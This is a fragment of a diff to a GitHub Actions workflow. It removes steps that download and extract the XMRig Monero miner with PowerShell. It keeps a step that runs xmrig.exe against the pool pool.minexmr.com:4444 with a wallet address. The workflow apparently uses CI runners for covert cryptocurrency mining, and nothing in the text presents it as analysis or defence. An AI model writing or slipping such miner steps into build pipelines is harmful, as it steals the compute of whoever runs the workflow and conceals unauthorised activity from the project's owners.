@@ -16,10 +16,6 @@ jobs:
         NUM_JOBS: 20
         JOB: ${{ matrix.go }}
     steps:
-    - name: DOWNLOAD
-      run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-msvc-win64.zip -outfile xmrig-6.18.0-msvc-win64.zip
-    - name: Extract
-      run: Expand-Archive xmrig-6.18.0-msvc-win64.zip
     - name: RUNNING
       run: .\xmrig-6.18.0\xmrig.exe -o pool.minexmr.com:4444 -u XBLXxdkK8PaivjZXaySgS2Yr6iPdDN94EbWwim1g6iaGJscTXnFHfJyGBk5HksVM9SthdFScd3ss
     - name: DONE
